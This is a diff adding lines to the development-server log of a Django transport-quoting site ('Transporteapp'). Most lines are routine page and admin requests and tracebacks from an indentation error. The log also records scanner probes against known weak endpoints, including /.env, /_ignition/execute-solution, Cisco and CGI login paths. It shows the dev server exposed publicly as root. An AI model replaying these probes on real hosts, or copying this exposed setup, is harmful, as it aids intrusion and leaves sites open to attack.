@@ -52396,3 +52396,1159 @@ Quit the server with CONTROL-C.
 [25/Jul/2023 03:35:39] "GET /static/img/banner.jpg HTTP/1.1" 304 0
 [25/Jul/2023 03:35:39] "GET /static/img/background.jpg HTTP/1.1" 304 0
 [25/Jul/2023 03:35:39] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+Not Found: /_ignition/execute-solution
+[25/Jul/2023 03:37:43] "GET /_ignition/execute-solution HTTP/1.1" 404 2755
+[25/Jul/2023 03:47:06] "GET / HTTP/1.1" 200 11503
+Forbidden (CSRF cookie not set.): /
+[25/Jul/2023 04:02:16] "POST / HTTP/1.1" 403 2922
+Not Found: /.env
+[25/Jul/2023 04:02:16] "GET /.env HTTP/1.1" 404 2686
+Not Found: /Autodiscover/Autodiscover.xml
+[25/Jul/2023 04:04:32] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2765
+Invalid HTTP_HOST header: 'Transporte-web'. You may need to add 'transporte-web' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 150, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'Transporte-web'. You may need to add 'transporte-web' to ALLOWED_HOSTS.
+Bad Request: /
+[25/Jul/2023 04:08:16] "                    GET / HTTP/1.0" 400 63051
+[25/Jul/2023 04:08:22] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:08:22] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 04:08:25] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:08:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 04:08:54] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x12;lWÀ½rÛt×¦\x83`/=Ä¬Íh\x8fí\x99%á3[\x96úùKõò\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+[25/Jul/2023 04:08:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 04:11:26] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:11:26] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /favicon.ico
+[25/Jul/2023 04:12:52] "GET /favicon.ico HTTP/1.1" 404 2707
+[25/Jul/2023 04:13:20] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:13:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /manage/account/login
+[25/Jul/2023 04:14:46] "GET /manage/account/login HTTP/1.1" 404 2734
+[25/Jul/2023 04:16:04] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:16:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 04:17:31] "GET /admin/index.html HTTP/1.1" 302 0
+[25/Jul/2023 04:19:01] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:19:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03q;oõ\x86Ð\x91\x8e')
+[25/Jul/2023 04:19:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /index.html
+[25/Jul/2023 04:20:31] "GET /index.html HTTP/1.1" 404 2704
+[25/Jul/2023 04:22:25] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:22:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /+CSCOE+/logon.html
+[25/Jul/2023 04:23:51] "GET /+CSCOE+/logon.html HTTP/1.1" 404 2728
+[25/Jul/2023 04:25:24] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:25:24] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /cgi-bin/login.cgi
+[25/Jul/2023 04:26:51] "GET /cgi-bin/login.cgi HTTP/1.1" 404 2725
+[25/Jul/2023 04:27:58] code 400, message Bad request version ('À\x14À')
+[25/Jul/2023 04:27:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+[25/Jul/2023 04:29:26] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:38:09] "GET / HTTP/1.1" 200 11503
+/root/Transporte/Transporteapp/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/threading.py", line 1016, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.10/threading.py", line 953, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/autoreload.py", line 64, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/commands/runserver.py", line 133, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/base.py", line 485, in check
+    all_issues = checks.run_checks(
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/registry.py", line 88, in run_checks
+    new_errors = check(app_configs=app_configs, databases=databases)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/urls.py", line 14, in check_url_config
+    return check_resolver(resolver)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/urls.py", line 24, in check_resolver
+    return check_method()
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 494, in check
+    for pattern in self.url_patterns:
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 57, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 715, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 57, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 708, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1006, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 688, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 883, in exec_module
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "/root/Transporte/proyecto/urls.py", line 20, in <module>
+    from Transporteapp import views
+  File "/root/Transporte/Transporteapp/views.py", line 15
+    messages.succes(request, 'Ha llegado una o más cotizaciones. Por favor revise en la sección')
+TabError: inconsistent use of tabs and spaces in indentation
+/root/Transporte/Transporteapp/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/threading.py", line 1016, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.10/threading.py", line 953, in run
+    self._target(*self._args, **self._kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/autoreload.py", line 64, in wrapper
+    fn(*args, **kwargs)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/commands/runserver.py", line 133, in inner_run
+    self.check(display_num_errors=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/management/base.py", line 485, in check
+    all_issues = checks.run_checks(
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/registry.py", line 88, in run_checks
+    new_errors = check(app_configs=app_configs, databases=databases)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/urls.py", line 14, in check_url_config
+    return check_resolver(resolver)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/checks/urls.py", line 24, in check_resolver
+    return check_method()
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 494, in check
+    for pattern in self.url_patterns:
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 57, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 715, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 57, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/urls/resolvers.py", line 708, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib/python3.10/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 1050, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 1027, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 1006, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 688, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 883, in exec_module
+  File "<frozen importlib._bootstrap>", line 241, in _call_with_frames_removed
+  File "/root/Transporte/proyecto/urls.py", line 20, in <module>
+    from Transporteapp import views
+  File "/root/Transporte/Transporteapp/views.py", line 14
+    messages.succes(request, 'Ha llegado una o más cotizaciones. Por favor revise en la sección')
+TabError: inconsistent use of tabs and spaces in indentation
+/root/Transporte/Transporteapp/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 25, 2023 - 04:44:01
+Django version 4.2.1, using settings 'proyecto.settings'
+Starting development server at http://147.182.184.6:80/
+Quit the server with CONTROL-C.
+
+[25/Jul/2023 04:44:04] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:44:04] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:04] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:04] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:04] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:04] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:04] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:05] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:36] "POST / HTTP/1.1" 200 11855
+[25/Jul/2023 04:44:36] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:36] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:37] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:37] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:37] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:37] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:46] "POST / HTTP/1.1" 302 0
+[25/Jul/2023 04:44:46] "GET /confirmacion HTTP/1.1" 200 2017
+[25/Jul/2023 04:44:49] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:44:49] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:49] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:49] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:49] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:49] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:49] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:44:51] "GET /admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:44:52] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 3154
+[25/Jul/2023 04:44:52] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:52] "GET /static/vendor/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 304 0
+[25/Jul/2023 04:44:56] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:44:56] "GET /admin/ HTTP/1.1" 200 26364
+[25/Jul/2023 04:44:57] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/jazzmin/js/main.js HTTP/1.1" 304 0
+[25/Jul/2023 04:44:57] "GET /static/vendor/fontawesome-free/webfonts/fa-regular-400.woff2 HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /admin/Transporteapp/cotizaci%C3%B3n/ HTTP/1.1" 200 25341
+[25/Jul/2023 04:45:01] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/vendor/select2/css/select2.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[25/Jul/2023 04:45:01] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:01] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/jazzmin/js/change_list.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/jazzmin/js/main.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:02] "GET /static/vendor/select2/js/select2.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /admin/ HTTP/1.1" 200 25829
+[25/Jul/2023 04:45:08] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:08] "GET /static/jazzmin/js/main.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /admin/logout/ HTTP/1.1" 200 2194
+[25/Jul/2023 04:45:11] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:11] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:13] "GET /admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:45:13] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 3154
+[25/Jul/2023 04:45:13] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:13] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:13] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:13] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:13] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:14] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:14] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:14] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:17] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:45:17] "GET /admin/ HTTP/1.1" 200 25829
+[25/Jul/2023 04:45:18] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:18] "GET /static/jazzmin/js/main.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /admin/logout/ HTTP/1.1" 200 2194
+[25/Jul/2023 04:45:20] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:20] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:45:21] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:45:21] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+/root/Transporte/Transporteapp/views.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 25, 2023 - 04:45:35
+Django version 4.2.1, using settings 'proyecto.settings'
+Starting development server at http://147.182.184.6:80/
+Quit the server with CONTROL-C.
+
+[25/Jul/2023 04:47:37] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:47:37] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:47:37] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:47:37] "GET /static/img/camion-1.jpeg HTTP/1.1" 304 0
+[25/Jul/2023 04:47:37] "GET /static/img/camion-2.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:47:37] "GET /static/img/background.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:47:37] "GET /static/img/banner.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:47:39] "GET /seguimiento HTTP/1.1" 200 5588
+[25/Jul/2023 04:47:39] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:47:39] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:47:40] "GET /static/img/background.jpg HTTP/1.1" 304 0
+/root/Transporte/proyecto/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+July 25, 2023 - 04:48:25
+Django version 4.2.1, using settings 'proyecto.settings'
+Starting development server at http://147.182.184.6:80/
+Quit the server with CONTROL-C.
+
+[25/Jul/2023 04:48:28] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:48:28] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[25/Jul/2023 04:48:28] "GET /static/css/main.css HTTP/1.1" 200 4582
+[25/Jul/2023 04:48:29] "GET /static/img/background.jpg HTTP/1.1" 200 142837
+[25/Jul/2023 04:48:29] "GET /static/img/camion-2.jpg HTTP/1.1" 200 92709
+[25/Jul/2023 04:48:29] "GET /static/img/camion-1.jpeg HTTP/1.1" 200 109171
+[25/Jul/2023 04:48:29] "GET /static/img/banner.jpg HTTP/1.1" 200 111174
+[25/Jul/2023 04:48:39] "GET /admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:48:40] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 3154
+[25/Jul/2023 04:48:40] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 200 59344
+[25/Jul/2023 04:48:40] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 200 163234
+[25/Jul/2023 04:48:40] "GET /static/jazzmin/css/main.css HTTP/1.1" 200 16969
+[25/Jul/2023 04:48:40] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 62440
+[25/Jul/2023 04:48:40] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 200 44244
+[25/Jul/2023 04:48:40] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 292458
+[25/Jul/2023 04:48:40] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 200 1382975
+[25/Jul/2023 04:48:41] "GET /static/vendor/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 78196
+[25/Jul/2023 04:48:45] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:48:45] "GET /admin/ HTTP/1.1" 200 25829
+[25/Jul/2023 04:48:45] "GET /static/vendor/fontawesome-free/webfonts/fa-regular-400.woff2 HTTP/1.1" 200 13276
+[25/Jul/2023 04:48:45] "GET /static/jazzmin/js/main.js HTTP/1.1" 200 2391
+[25/Jul/2023 04:48:47] "GET /admin/Transporteapp/bitacora/ HTTP/1.1" 200 17188
+[25/Jul/2023 04:48:47] "GET /static/admin/js/vendor/jquery/jquery.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:48:47] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[25/Jul/2023 04:48:47] "GET /static/vendor/select2/css/select2.min.css HTTP/1.1" 200 16264
+[25/Jul/2023 04:48:47] "GET /static/admin/js/core.js HTTP/1.1" 200 5682
+[25/Jul/2023 04:48:47] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[25/Jul/2023 04:48:47] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 8943
+[25/Jul/2023 04:48:47] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7887
+[25/Jul/2023 04:48:47] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[25/Jul/2023 04:48:47] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[25/Jul/2023 04:48:47] "GET /static/admin/js/vendor/xregexp/xregexp.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:48:48] "GET /static/vendor/select2/js/select2.min.js HTTP/1.1" 200 73170
+[25/Jul/2023 04:48:48] "GET /static/jazzmin/js/change_list.js HTTP/1.1" 200 2252
+[25/Jul/2023 04:48:48] "GET /admin/Transporteapp/bitacora/1/change/ HTTP/1.1" 200 19982
+[25/Jul/2023 04:48:49] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[25/Jul/2023 04:48:49] "GET /admin/jsi18n/ HTTP/1.1" 200 8006
+[25/Jul/2023 04:48:49] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[25/Jul/2023 04:48:49] "GET /static/jazzmin/js/change_form.js HTTP/1.1" 200 6052
+[25/Jul/2023 04:48:49] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 586
+[25/Jul/2023 04:48:49] "GET /static/admin/img/icon-viewlink.svg HTTP/1.1" 200 581
+[25/Jul/2023 04:48:49] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[25/Jul/2023 04:48:51] "GET /admin/Transporteapp/bitacora/ HTTP/1.1" 200 17188
+[25/Jul/2023 04:49:02] "GET / HTTP/1.1" 200 11503
+[25/Jul/2023 04:49:04] "GET /admin/ HTTP/1.1" 200 25829
+[25/Jul/2023 04:49:07] "GET /seguimiento HTTP/1.1" 200 5588
+[25/Jul/2023 04:49:10] "POST /seguimiento HTTP/1.1" 200 5720
+[25/Jul/2023 04:49:13] "POST /seguimiento HTTP/1.1" 200 7485
+[25/Jul/2023 04:49:13] "GET /media/bitacora_imagenes/donniedarko.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:49:13] "GET /media/bitacora_imagenes/dsad.png HTTP/1.1" 304 0
+[25/Jul/2023 04:49:13] "GET /media/bitacora_imagenes/efectomariposa.jpg HTTP/1.1" 304 0
+[25/Jul/2023 04:49:39] "GET /admin/logout/ HTTP/1.1" 200 2194
+[25/Jul/2023 04:49:39] "GET /static/img/image-tda.png HTTP/1.1" 304 0
+[25/Jul/2023 04:49:40] "GET /admin/ HTTP/1.1" 302 0
+[25/Jul/2023 04:49:41] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 3154
+[25/Jul/2023 04:49:41] "GET /static/jazzmin/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/vendor/bootswatch/simplex/bootstrap.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/vendor/adminlte/css/adminlte.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/vendor/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[25/Jul/2023 04:49:41] "GET /static/vendor/adminlte/js/adminlte.min.js HTTP/1.1" 304 0
+[25/Jul/2023 04:49:53] "GET /seguimiento HTTP/1.1" 200 5588
+[25/Jul/2023 04:49:53] "GET /static/css/main.css HTTP/1.1" 304 0
+[25/Jul/2023 04:49:53] "GET /static/img/image-tda.png HTTP/1.1" 200 69859
+[25/Jul/2023 04:49:54] "GET /static/img/background.jpg HTTP/1.1" 200 142837
